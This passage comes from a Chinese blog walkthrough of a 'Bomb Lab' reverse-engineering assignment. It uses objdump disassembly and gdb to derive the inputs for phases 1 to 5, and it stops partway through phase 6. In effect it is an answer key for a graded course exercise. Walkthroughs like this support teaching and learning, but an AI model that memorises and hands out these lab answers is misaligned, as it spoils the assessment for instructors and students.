<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">000000000000140f &lt;phase_1&gt;:</span><br><span class="line">    140f:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">    1413:	48 8d 35 36 1d 00 00 	lea    0x1d36(%rip),%rsi        # 3150 &lt;_IO_stdin_used+0x150&gt;</span><br><span class="line">    141a:	e8 f0 04 00 00       	callq  190f &lt;strings_not_equal&gt;</span><br><span class="line">    141f:	85 c0                	test   %eax,%eax</span><br><span class="line">    1421:	75 05                	jne    1428 &lt;phase_1+0x19&gt;</span><br><span class="line">    1423:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">    1427:	c3                   	retq   </span><br><span class="line">    1428:	e8 ee 05 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br><span class="line">    142d:	eb f4                	jmp    1423 &lt;phase_1+0x14&gt;</span><br></pre></td></tr></table></figure>
<p>如果字符串不相等，函数返回 1，<code>jne</code> 指令发生跳转，进入 <code>explode_bomb</code> 函数；如果字符串相等的话，函数返回 0，<code>jne</code> 指令不发生跳转，直接退出。<br><code>strings_not_equal</code> 函数有两个参数，分别为<code>%rdi</code>和<code>%rsi</code>: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">000000000000190f &lt;strings_not_equal&gt;:</span><br><span class="line">    190f:	41 54                	push   %r12</span><br><span class="line">    1911:	55                   	push   %rbp</span><br><span class="line">    1912:	53                   	push   %rbx</span><br><span class="line">    1913:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">    1916:	48 89 f5             	mov    %rsi,%rbp</span><br><span class="line">    1919:	e8 d4 ff ff ff       	callq  18f2 &lt;string_length&gt;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>一个参数为字符串输入，另一个参数由 <code>phase_1</code> 传入。因此，用 <code>gdb</code> 在 <code>strings_not_equal</code> 处进行断点调试，便可得出答案：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break strings_not_equal</span><br><span class="line">Breakpoint 1 at 0x190f</span><br><span class="line">(gdb) run</span><br><span class="line">Starting program: &#x2F;mnt&#x2F;c&#x2F;ubuntu&#x2F;bomb65&#x2F;bomb </span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x000000000800190f in strings_not_equal ()</span><br><span class="line">(gdb) p (char*)$rdi</span><br><span class="line">$1 &#x3D; 0x80056a0 &lt;input_strings&gt; &quot;test&quot;</span><br><span class="line">(gdb) p (char*)$rsi</span><br><span class="line">$2 &#x3D; 0x8003150 &quot;I am just a renegade hockey mom.&quot;</span><br></pre></td></tr></table></figure>
<p>第一关答案为 <code>I am just a renegade hockey mom.</code> 。</p>
<h2 id="bomb-2"><a href="#bomb-2" class="headerlink" title="bomb 2"></a>bomb 2</h2><p>直接看 <code>phase_2</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">000000000000142f &lt;phase_2&gt;:</span><br><span class="line">    ...</span><br><span class="line">    143e:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br><span class="line">    1443:	31 c0                	xor    %eax,%eax</span><br><span class="line">    1445:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">    1448:	e8 f4 05 00 00       	callq  1a41 &lt;read_six_numbers&gt;</span><br><span class="line">    144d:	83 3c 24 00          	cmpl   $0x0,(%rsp)              -&gt; arr[0] &#x3D; 0</span><br><span class="line">    1451:	75 07                	jne    145a &lt;phase_2+0x2b&gt;</span><br><span class="line">    1453:	83 7c 24 04 01       	cmpl   $0x1,0x4(%rsp)           -&gt; arr[1] &#x3D; 1</span><br><span class="line">    1458:	74 05                	je     145f &lt;phase_2+0x30&gt;</span><br><span class="line">    145a:	e8 bc 05 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br><span class="line">    145f:	48 89 e3             	mov    %rsp,%rbx                -&gt; %rbx &#x3D; arr[0]</span><br><span class="line">    1462:	48 8d 6b 10          	lea    0x10(%rbx),%rbp          -&gt; %rbp &#x3D; arr[4]</span><br><span class="line">    1466:	eb 0e                	jmp    1476 &lt;phase_2+0x47&gt;</span><br><span class="line">    1468:	e8 ae 05 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br><span class="line">    146d:	48 83 c3 04          	add    $0x4,%rbx                -&gt; %rbx &#x3D; arr[1]</span><br><span class="line">    1471:	48 39 eb             	cmp    %rbp,%rbx                -&gt; if (%rbx &#x3D;&#x3D; arr[4])</span><br><span class="line">    1474:	74 0c                	je     1482 &lt;phase_2+0x53&gt;</span><br><span class="line">    1476:	8b 43 04             	mov    0x4(%rbx),%eax           -&gt; %eax &#x3D; arr[1]</span><br><span class="line">    1479:	03 03                	add    (%rbx),%eax              -&gt; %eax &#x3D; arr[0] + arr[1]</span><br><span class="line">    147b:	39 43 08             	cmp    %eax,0x8(%rbx)           -&gt; if (%eax &#x3D;&#x3D; arr[2])</span><br><span class="line">    147e:	74 ed                	je     146d &lt;phase_2+0x3e&gt;</span><br><span class="line">    1480:	eb e6                	jmp    1468 &lt;phase_2+0x39&gt;</span><br><span class="line">    1482:	48 8b 44 24 18       	mov    0x18(%rsp),%rax</span><br><span class="line">    1487:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>在 <code>147b</code> 处，若 <code>arr[2] = arr[0] + arr[1]</code>，则函数继续跳转到 <code>146d</code> 处执行，这时 <code>%rbx</code> 的保存的地址由 <code>arr[0]</code> 变为 <code>arr[1]</code>，接下来判断 <code>arr[3], arr[4]</code>……直到 <code>%rbx == arr[4]</code>，也就是判断完了 <code>arr[5]</code> 后停止。因此可以得出，这 6 个数由前两项分别为 0 和 1 的斐波拉契数列组成。第二关答案为 <code>0 1 1 2 3 5</code> 。</p>
<h2 id="bomb-3"><a href="#bomb-3" class="headerlink" title="bomb 3"></a>bomb 3</h2><p>在 <code>phase_3</code> 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">14c1:	e8 5a fc ff ff       	callq  1120 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">14c6:	83 f8 01             	cmp    $0x1,%eax</span><br></pre></td></tr></table></figure>
<p>在 <code>14c6</code> 处打断点，输入多个数后，打印 <code>%eax</code> 中的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) i r eax</span><br><span class="line">eax            0x2      2</span><br></pre></td></tr></table></figure>
<p>可以判断，在 <code>phase_3</code> 中，我们需要输入两个数。再观察以下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">14cb:	83 3c 24 07          	cmpl   $0x7,(%rsp)</span><br><span class="line">14cf:	77 4b                	ja     151c &lt;phase_3+0x7e&gt;</span><br></pre></td></tr></table></figure>
<p>我们输入的第一个数不能大于 7。再向下看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">14db:	48 63 04 82          	movslq (%rdx,%rax,4),%rax</span><br><span class="line">14df:	48 01 d0             	add    %rdx,%rax</span><br><span class="line">14e2:	ff e0                	jmpq   *%rax</span><br><span class="line">14e4:	e8 32 05 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br><span class="line">14e9:	eb e0                	jmp    14cb &lt;phase_3+0x2d&gt;</span><br><span class="line">14eb:	b8 ab 00 00 00       	mov    $0xab,%eax</span><br><span class="line">14f0:	eb 3b                	jmp    152d &lt;phase_3+0x8f&gt;</span><br><span class="line">14f2:	b8 ea 01 00 00       	mov    $0x1ea,%eax</span><br><span class="line">14f7:	eb 34                	jmp    152d &lt;phase_3+0x8f&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">152d:	39 44 24 04          	cmp    %eax,0x4(%rsp)</span><br><span class="line">1531:	75 15                	jne    1548 &lt;phase_3+0xaa&gt;</span><br><span class="line">1533:	48 8b 44 24 08       	mov    0x8(%rsp),%rax</span><br><span class="line">1538:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">153f:	00 00 </span><br><span class="line">1541:	75 0c                	jne    154f &lt;phase_3+0xb1&gt;</span><br><span class="line">1543:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">1547:	c3                   	retq   </span><br><span class="line">1548:	e8 ce 04 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br><span class="line">154d:	eb e4                	jmp    1533 &lt;phase_3+0x95&gt;</span><br><span class="line">154f:	e8 2c fb ff ff       	callq  1080 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到这是 switch 的特征，根据 <code>%rax</code> 中的地址进行跳转，跳转后将数存入 <code>%eax</code> 中， 再跳入 <code>152d</code> 处将数与输入的第二个参数进行比较，如果不相等则触发炸弹爆炸。<br>在这里我输入的第一个参数为 <code>1</code>，用 <code>gdb</code> 调试，查看 <code>%rax</code> 存储的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) i r rax</span><br><span class="line">rax            0x80014eb        134223083</span><br></pre></td></tr></table></figure>
<p>这里将跳转至 <code>14eb</code> 处，即输入的第二个参数应该是 <code>0xab</code>，才不会发生爆炸。因此，第三关答案为 <code>1 171</code> (答案不唯一)。</p>
<h2 id="bomb-4"><a href="#bomb-4" class="headerlink" title="bomb 4"></a>bomb 4</h2><p>和 <code>phase_3</code> 一样，接收两个参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">15b9:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">15bc:	75 06                	jne    15c4 &lt;phase_4+0x33&gt;</span><br></pre></td></tr></table></figure>
<p>并且第一个参数不能大于 15：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">15be:	83 3c 24 0e          	cmpl   $0xe,(%rsp)</span><br><span class="line">15c2:	76 05                	jbe    15c9 &lt;phase_4+0x38&gt;</span><br></pre></td></tr></table></figure>
<p><code>func4</code> 的返回值必须要等于 3，并且第二个参数也要等于 3，负责触发炸弹爆炸：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">15c9:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br><span class="line">15ce:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">15d3:	8b 3c 24             	mov    (%rsp),%edi</span><br><span class="line">15d6:	e8 79 ff ff ff       	callq  1554 &lt;func4&gt;</span><br><span class="line">15db:	83 f8 03             	cmp    $0x3,%eax</span><br><span class="line">15de:	75 07                	jne    15e7 &lt;phase_4+0x56&gt;</span><br><span class="line">15e0:	83 7c 24 04 03       	cmpl   $0x3,0x4(%rsp)</span><br><span class="line">15e5:	74 05                	je     15ec &lt;phase_4+0x5b&gt;</span><br><span class="line">15e7:	e8 2f 04 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br><span class="line">15ec:	48 8b 44 24 08       	mov    0x8(%rsp),%rax</span><br><span class="line">15f1:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br></pre></td></tr></table></figure>
<p>再看看 <code>func4</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0000000000001554 &lt;func4&gt;:</span><br><span class="line">    1554:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">    1558:	89 d0                	mov    %edx,%eax</span><br><span class="line">    155a:	29 f0                	sub    %esi,%eax</span><br><span class="line">    155c:	89 c1                	mov    %eax,%ecx</span><br><span class="line">    155e:	c1 e9 1f             	shr    $0x1f,%ecx</span><br><span class="line">    1561:	01 c1                	add    %eax,%ecx</span><br><span class="line">    1563:	d1 f9                	sar    %ecx</span><br><span class="line">    1565:	01 f1                	add    %esi,%ecx</span><br><span class="line">    1567:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">    1569:	7f 0c                	jg     1577 &lt;func4+0x23&gt;</span><br><span class="line">    156b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">    1570:	7c 11                	jl     1583 &lt;func4+0x2f&gt;</span><br><span class="line">    1572:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">    1576:	c3                   	retq   </span><br><span class="line">    1577:	8d 51 ff             	lea    -0x1(%rcx),%edx</span><br><span class="line">    157a:	e8 d5 ff ff ff       	callq  1554 &lt;func4&gt;</span><br><span class="line">    157f:	01 c0                	add    %eax,%eax</span><br><span class="line">    1581:	eb ef                	jmp    1572 &lt;func4+0x1e&gt;</span><br><span class="line">    1583:	8d 71 01             	lea    0x1(%rcx),%esi</span><br><span class="line">    1586:	e8 c9 ff ff ff       	callq  1554 &lt;func4&gt;</span><br><span class="line">    158b:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">    158f:	eb e1                	jmp    1572 &lt;func4+0x1e&gt;</span><br></pre></td></tr></table></figure>
<p>说几个值得注意的点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">155a:	29 f0                	sub    %esi,%eax</span><br><span class="line">155c:	89 c1                	mov    %eax,%ecx</span><br><span class="line">155e:	c1 e9 1f             	shr    $0x1f,%ecx</span><br><span class="line">1561:	01 c1                	add    %eax,%ecx</span><br><span class="line">1563:	d1 f9                	sar    %ecx</span><br><span class="line">1565:	01 f1                	add    %esi,%ecx</span><br></pre></td></tr></table></figure>
<p>这几行的意思是，如果 <code>%eax</code> &lt; <code>%esi</code> 的话，<code>%ecx = (%eax - %esi + 1) / 2 + %esi = (%eax + %esi + 1) / 2</code>，否则 <code>%ecx = (%eax + %esi) / 2</code>。接下来再看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1567:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">1569:	7f 0c                	jg     1577 &lt;func4+0x23&gt;</span><br><span class="line">156b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">1570:	7c 11                	jl     1583 &lt;func4+0x2f&gt;</span><br><span class="line">1572:	48 83 c4 08          	add    $0x8,%rsp</span><br></pre></td></tr></table></figure>
<p>只有当 <code>%edi = %ecx</code> 时，函数才会退出。最后再看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1577:	8d 51 ff             	lea    -0x1(%rcx),%edx</span><br><span class="line">157a:	e8 d5 ff ff ff       	callq  1554 &lt;func4&gt;</span><br><span class="line">157f:	01 c0                	add    %eax,%eax</span><br><span class="line">1581:	eb ef                	jmp    1572 &lt;func4+0x1e&gt;</span><br><span class="line">1583:	8d 71 01             	lea    0x1(%rcx),%esi</span><br><span class="line">1586:	e8 c9 ff ff ff       	callq  1554 &lt;func4&gt;</span><br><span class="line">158b:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">158f:	eb e1                	jmp    1572 &lt;func4+0x1e&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码也就是修改 <code>%rcx</code> 的值，传递参数，递归调用。整个 <code>func4</code> 汇编代码用 Python 表示可以是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def func4(a, c, d):</span><br><span class="line">    if d &lt; c:</span><br><span class="line">        b &#x3D; (d + c + 1) &#x2F; 2</span><br><span class="line">    else:</span><br><span class="line">        b &#x3D; (d + c) &#x2F; 2</span><br><span class="line">    </span><br><span class="line">    if b &lt; a:</span><br><span class="line">        return func4(a, b+1, d)*2 + 1</span><br><span class="line">    if b &gt; a:</span><br><span class="line">        return func4(a, c, b-1)*2</span><br><span class="line">    else:</span><br><span class="line">        return 0</span><br></pre></td></tr></table></figure>
<p>因此，第四关答案为 <code>13 3</code> 或者 <code>12 3</code>。</p>
<h2 id="bomb-5"><a href="#bomb-5" class="headerlink" title="bomb 5"></a>bomb 5</h2><p>与 <code>phase_3</code> 类似，首先我们知道输入的数至少有2个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1629:	e8 f2 fa ff ff       	callq  1120 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">162e:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">1631:	7e 5a                	jle    168d &lt;phase_5+0x87&gt;</span><br></pre></td></tr></table></figure>
<p>然后我们输入的一个参数的二进制后四位不能为1111(15)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1633:	8b 04 24             	mov    (%rsp),%eax</span><br><span class="line">1636:	83 e0 0f             	and    $0xf,%eax</span><br><span class="line">1639:	89 04 24             	mov    %eax,(%rsp)</span><br><span class="line">163c:	83 f8 0f             	cmp    $0xf,%eax</span><br><span class="line">163f:	74 32                	je     1673 &lt;phase_5+0x6d&gt;</span><br></pre></td></tr></table></figure>
<p>接下来分析数组，用 <code>gdb</code> 调试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p&#x2F;x *(int *)($rsi)@100</span><br><span class="line">$1 &#x3D; &#123;0xa, 0x2, 0xe, 0x7, 0x8, 0xc, 0xf, 0xb, 0x0, 0x4, 0x1, 0xd, 0x3, 0x9, 0x6, 0x5, 0x79206f53, ......&#125;</span><br><span class="line">(gdb) p *$rsi@16</span><br><span class="line">$2 &#x3D; &#123;10, 2, 14, 7, 8, 12, 15, 11, 0, 4, 1, 13, 3, 9, 6, 5&#125;</span><br></pre></td></tr></table></figure>
<p>这个数组一共有 16 位，数组中的元素为 <code>&#123;10, 2, 14, 7, 8, 12, 15, 11, 0, 4, 1, 13, 3, 9, 6, 5&#125;</code>。<br>接下来的汇编代码表示一个循环，寄存器 <code>%edx</code> 初值定为 0，每次循环加 1，根据后面 <code>cmp 0xf, %edx</code> 可以得出，循环必须执行 15 次；同时ecx寄存器不断的累加数，每次把一个数的值存到 <code>%eax</code> 寄存器中，并且作为下次取值的索引，即对于每对索引 <code>i</code> 和值 <code>v</code> 而言，下一个 <code>v&#39;</code> 位于索引 <code>v</code> 处，相当于构成了一个环形链表。另外，传入的第一个参数不能为 15，并且在遍历过程中，根据 <code>cmp $0xf,%eax</code>，<code>%eax</code> 也不能等于15。索引 15 对应的值为 5， 因此，传入的第一个参数必须是 5，累加循环从索引 5 对应的值开始，这样才能保证能够循环 15 次，对 15 个遍历到的值进行累加，累加和为 <code>(0 + 15) * 16 / 2 -5 = 115</code>。<br>因此，第五关答案为 <code>5 115</code>。</p>
<h2 id="bomb-6"><a href="#bomb-6" class="headerlink" title="bomb 6"></a>bomb 6</h2><p><code>phase_6</code> 汇编代码太多，需要花费一定的时间。<br>首先，进入函数做一些初始化的工作后，根据 <code>jmpq 177a &lt;phase_6+0xe1&gt;</code> ，函数会跳转到 <code>177a</code> 处执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">175d:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line">1761:	83 fb 05             	cmp    $0x5,%ebx</span><br><span class="line">1764:	7f 0c                	jg     1772 &lt;phase_6+0xd9&gt;</span><br><span class="line">1766:	41 8b 44 9d 00       	mov    0x0(%r13,%rbx,4),%eax</span><br><span class="line">176b:	39 45 00             	cmp    %eax,0x0(%rbp)</span><br><span class="line">176e:	75 ed                	jne    175d &lt;phase_6+0xc4&gt;</span><br><span class="line">1770:	eb e6                	jmp    1758 &lt;phase_6+0xbf&gt;</span><br><span class="line">1772:	49 83 c7 01          	add    $0x1,%r15</span><br><span class="line">1776:	49 83 c6 04          	add    $0x4,%r14</span><br><span class="line">177a:	4c 89 f5             	mov    %r14,%rbp</span><br><span class="line">177d:	41 8b 06             	mov    (%r14),%eax</span><br><span class="line">1780:	83 e8 01             	sub    $0x1,%eax</span><br><span class="line">1783:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">1786:	0f 87 47 ff ff ff    	ja     16d3 &lt;phase_6+0x3a&gt;</span><br><span class="line">178c:	49 83 ff 06          	cmp    $0x6,%r15</span><br><span class="line">1790:	0f 84 47 ff ff ff    	je     16dd &lt;phase_6+0x44&gt;</span><br><span class="line">1796:	4c 89 fb             	mov    %r15,%rbx</span><br><span class="line">1799:	eb cb                	jmp    1766 &lt;phase_6+0xcd&gt;</span><br></pre></td></tr></table></figure>
<p>从 <code>177a</code> 处开始看起，首先会判断传入的第一个参数减 1 后是否大于 5，也就是这里需要保证参数不能超过 6。之后跳入 <code>1766</code> 处执行，<code>1766</code> -&gt; <code>176e</code> -&gt; <code>175d</code> -&gt; <code>1766</code> 构成了一个循环，判断当前参数的后面几个参数是否与当前参数相等，相等则炸弹爆炸。 然后跳到 <code>1772</code> 处执行，判断第二个参数减 1 后是否大于 5……即整个这一部分代码是一个大循环，来保证 6 个参数不大于 6，并且各不相等。<br>接下来，函数会跳到 <code>16dd</code> 处执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">16dd:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi</span><br><span class="line">16e2:	49 8d 7c 24 18       	lea    0x18(%r12),%rdi</span><br><span class="line">16e7:	41 8b 0c 24          	mov    (%r12),%ecx</span><br><span class="line">16eb:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">16f0:	48 8d 15 19 3b 00 00 	lea    0x3b19(%rip),%rdx        # 5210 &lt;node1&gt;</span><br><span class="line">16f7:	83 f9 01             	cmp    $0x1,%ecx</span><br><span class="line">16fa:	7e 0b                	jle    1707 &lt;phase_6+0x6e&gt;</span><br><span class="line">16fc:	48 8b 52 08          	mov    0x8(%rdx),%rdx</span><br><span class="line">1700:	83 c0 01             	add    $0x1,%eax</span><br><span class="line">1703:	39 c8                	cmp    %ecx,%eax</span><br><span class="line">1705:	75 f5                	jne    16fc &lt;phase_6+0x63&gt;</span><br><span class="line">1707:	48 89 16             	mov    %rdx,(%rsi)</span><br><span class="line">170a:	49 83 c4 04          	add    $0x4,%r12</span><br><span class="line">170e:	48 83 c6 08          	add    $0x8,%rsi</span><br><span class="line">1712:	4c 39 e7             	cmp    %r12,%rdi</span><br><span class="line">1715:	75 d0                	jne    16e7 &lt;phase_6+0x4e&gt;</span><br></pre></td></tr></table></figure>
<p>我们输入的参数数组存放在 <code>%r12</code> 中，根据 <code>lea 0x18(%r12),%rdi</code> 可以得出，<code>%rdi</code> 存放了数组的结束地址。这段代码做的就是根据我们输入的参数将 <code>node</code> 按照顺序放入栈中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for(int i &#x3D; 0; i &lt; 6; i++)</span><br><span class="line">&#123;</span><br><span class="line">    %rdx &#x3D; 0x3b19(%rip);</span><br><span class="line">    for(int j &#x3D; 0; j &lt; arr[i]; j++)</span><br><span class="line">        %rdx &#x3D; addr + 0x8;</span><br><span class="line">    %rsi &#x3D; *%rdx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再看之后的代码，将 <code>%rax</code> 指向 <code>%rbx</code> 下一个链表节点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1717:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx</span><br><span class="line">171c:	48 8b 44 24 28       	mov    0x28(%rsp),%rax</span><br><span class="line">1721:	48 89 43 08          	mov    %rax,0x8(%rbx)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>最后，比较链表节点中第一个字段值的大小，如果前一个节点值小于后一个节点值，炸弹爆炸：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">179b:	48 8b 5b 08          	mov    0x8(%rbx),%rbx</span><br><span class="line">179f:	83 ed 01             	sub    $0x1,%ebp</span><br><span class="line">17a2:	74 11                	je     17b5 &lt;phase_6+0x11c&gt;</span><br><span class="line">17a4:	48 8b 43 08          	mov    0x8(%rbx),%rax</span><br><span class="line">17a8:	8b 00                	mov    (%rax),%eax</span><br><span class="line">17aa:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">17ac:	7d ed                	jge    179b &lt;phase_6+0x102&gt;</span><br><span class="line">17ae:	e8 68 02 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>在此我们知道数据是根据每个节点中的第一个数升序排列。<br>所以只需要查看初始链表存储的数据即可得出答案：</p>
